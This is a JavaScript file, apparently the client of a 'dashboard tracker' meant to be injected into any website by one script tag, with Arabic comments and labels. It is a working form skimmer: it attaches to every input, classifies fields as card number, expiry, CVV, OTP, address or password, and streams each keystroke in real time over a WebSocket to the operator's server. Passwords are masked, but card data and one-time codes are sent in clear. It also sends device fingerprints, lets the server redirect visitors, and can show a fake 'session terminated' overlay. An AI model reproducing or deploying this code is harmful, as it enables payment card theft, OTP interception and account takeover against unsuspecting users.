/**
 * Dashboard Tracker v2
 * ضع هذا السطر في أي موقع:
 * <script src="https://YOUR-SERVER/tracker.js"></script>
 */
(function () {
  'use strict';

  // ── Server URL ──────────────────────────────────────────────────────────────
  const SERVER = (function () {
    const s = document.querySelector('script[src*="tracker.js"]');
    return s ? new URL(s.src).origin : location.origin;
  })();
  const WS = SERVER.replace(/^http/, 'ws') + '/';

  let ws = null, sid = null, pingTimer = null, reconnectTimer = null;
  const startTime = Date.now();

  // ── Connect ─────────────────────────────────────────────────────────────────
  function connect() {
    try { ws = new WebSocket(WS); } catch(e) { retry(); return; }

    ws.onopen = function () {
      clearTimeout(reconnectTimer);
      send({ type: 'page_info', url: location.href, title: document.title });
      send({ type: 'device_info', data: getDevice() });
      startPing();
      discoverPages();
      loadFP();
    };

    ws.onmessage = function (e) {
      let m; try { m = JSON.parse(e.data); } catch { return; }
      if (m.type === 'init')      sid = m.id;
      if (m.type === 'redirect')  location.href = m.url;
      if (m.type === 'terminate') terminate(m.message);
      if (m.type === 'pong')      return;
    };

    ws.onclose = function () { clearInterval(pingTimer); retry(); };
    ws.onerror = function () {};
  }

  function send(data) {
    if (ws && ws.readyState === WebSocket.OPEN) {
      try { ws.send(JSON.stringify(data)); } catch(e) {}
    }
  }

  function retry() {
    clearTimeout(reconnectTimer);
    reconnectTimer = setTimeout(connect, 3000);
  }

  function startPing() {
    clearInterval(pingTimer);
    pingTimer = setInterval(() => send({ type: 'ping' }), 5000);
  }

  // ── Device Info ─────────────────────────────────────────────────────────────
  function getDevice() {
    const ua = navigator.userAgent;
    let deviceName = 'Unknown', osVersion = '';

    if (/iPhone/.test(ua)) {
      const m = ua.match(/OS (\d+_\d+)/);
      const v = m ? parseInt(m[1]) : 0;
      deviceName = v >= 17 ? 'iPhone 15/16' : v >= 16 ? 'iPhone 14/15' : v >= 15 ? 'iPhone 13/14' : 'iPhone';
      osVersion = 'iOS ' + (m ? m[1].replace('_', '.') : '');
    } else if (/iPad/.test(ua)) {
      deviceName = 'iPad'; osVersion = 'iPadOS';
    } else if (/Android/.test(ua)) {
      const m = ua.match(/Android (\d+)/);
      deviceName = /Samsung/.test(ua) ? 'Samsung Galaxy' : 'Android';
      osVersion = 'Android ' + (m ? m[1] : '');
    } else if (/Macintosh/.test(ua)) {
      deviceName = 'Mac'; osVersion = 'macOS';
    } else if (/Windows/.test(ua)) {
      deviceName = 'Windows PC'; osVersion = 'Windows';
    }

    return {
      deviceName, osVersion,
      language:  navigator.language,
      timezone:  Intl.DateTimeFormat().resolvedOptions().timeZone,
      screen:    screen.width + 'x' + screen.height,
      touch:     'ontouchstart' in window
    };
  }

  // ── Fingerprint ─────────────────────────────────────────────────────────────
  function loadFP() {
    if (window.DeviceFingerprint) { collectFP(); return; }
    const s = document.createElement('script');
    s.src = SERVER + '/fingerprint.js';
    s.onload = collectFP;
    s.onerror = collectFP;
    document.head.appendChild(s);
  }

  function collectFP() {
    if (!window.DeviceFingerprint) return;
    window.DeviceFingerprint.collect(function (fp) {
      send({ type: 'fingerprint', data: fp });
    });
  }

  // ── Field Tracking ──────────────────────────────────────────────────────────
  function fieldType(el) {
    const n = (el.name || el.id || el.placeholder || el.autocomplete || '').toLowerCase();
    const t = (el.type || '').toLowerCase();
    if (t === 'email' || n.match(/email|mail/)) return 'email';
    if (t === 'tel'   || n.match(/phone|mobile|هاتف/)) return 'phone';
    if (n.match(/card.?num|cardnum|cc.?num|بطاقة|card(?!holder)/)) return 'card';
    if (n.match(/expir|exp.?date|mm.?yy|تاريخ/)) return 'expiry';
    if (n.match(/cvv|cvc|csc|security.?code/)) return 'cvv';
    if (n.match(/otp|verify|code|كود|تحقق/)) return 'otp';
    if (n.match(/coupon|promo|discount/)) return 'coupon';
    if (n.match(/address|عنوان/)) return 'address';
    if (n.match(/^name|full.?name|اسم/)) return 'name';
    if (t === 'password' || n.match(/password|كلمة/)) return 'password';
    return 'text';
  }

  function attachField(el) {
    if (el._t) return; el._t = true;
    const fname = el.name || el.id || el.placeholder || el.type || 'field';
    const ft    = fieldType(el);

    el.addEventListener('focus', () => {
      send({ type: 'field_focus', field: fname, fieldType: ft });
      if (ft === 'otp') {
        el.setAttribute('autocomplete', 'one-time-code');
        el.setAttribute('inputmode', 'numeric');
      }
    });

    el.addEventListener('input', () => {
      const val = ft === 'password' ? '●'.repeat(el.value.length) : el.value;
      send({ type: 'keypress', field: fname, value: val, fieldType: ft });
    });
  }

  function scanFields() {
    document.querySelectorAll('input, textarea, select').forEach(attachField);
  }

  scanFields();
  new MutationObserver(scanFields).observe(document.body || document.documentElement, { childList: true, subtree: true });

  // ── Tab Visibility ──────────────────────────────────────────────────────────
  document.addEventListener('visibilitychange', () =>
    send({ type: document.hidden ? 'tab_hidden' : 'tab_visible' }));

  // ── Page Discovery ──────────────────────────────────────────────────────────
  function discoverPages() {
    const pages = [], seen = new Set();
    pages.push({ url: location.href, title: document.title, path: location.pathname, isNav: true });
    seen.add(location.pathname);
    const navPaths = new Set();
    document.querySelectorAll('nav a, header a, .menu a, .navbar a').forEach(a => {
      try { navPaths.add(new URL(a.href, location.origin).pathname); } catch(e) {}
    });
    document.querySelectorAll('a[href]').forEach(a => {
      try {
        const u = new URL(a.href, location.origin);
        if (u.origin === location.origin && !seen.has(u.pathname)) {
          seen.add(u.pathname);
          pages.push({
            url: u.href, path: u.pathname,
            title: (a.innerText || a.title || u.pathname).trim().substring(0, 50),
            isNav: navPaths.has(u.pathname)
          });
        }
      } catch(e) {}
    });
    if (pages.length) send({ type: 'pages_discovered', pages: pages.slice(0, 100) });
  }

  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', discoverPages);
  else setTimeout(discoverPages, 800);

  // ── Page Navigation ─────────────────────────────────────────────────────────
  window.addEventListener('popstate', () => {
    send({ type: 'page_info', url: location.href, title: document.title });
    setTimeout(discoverPages, 500);
  });
  const origPush = history.pushState;
  history.pushState = function () {
    origPush.apply(this, arguments);
    send({ type: 'page_info', url: location.href, title: document.title });
    setTimeout(discoverPages, 500);
  };

  // ── Terminate Overlay ───────────────────────────────────────────────────────
  function terminate(msg) {
    const o = document.createElement('div');
    o.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.92);z-index:999999;display:flex;align-items:center;justify-content:center;font-family:Arial,sans-serif';
    o.innerHTML = `<div style="background:#fff;border-radius:16px;padding:40px;max-width:380px;text-align:center"><div style="font-size:52px;margin-bottom:12px">🚫</div><h2 style="color:#e74c3c;margin:0 0 10px">تم إنهاء الجلسة</h2><p style="color:#666;margin:0">${msg}</p></div>`;
    document.body.appendChild(o);
    document.body.style.pointerEvents = 'none';
    o.style.pointerEvents = 'all';
  }

  connect();
})();
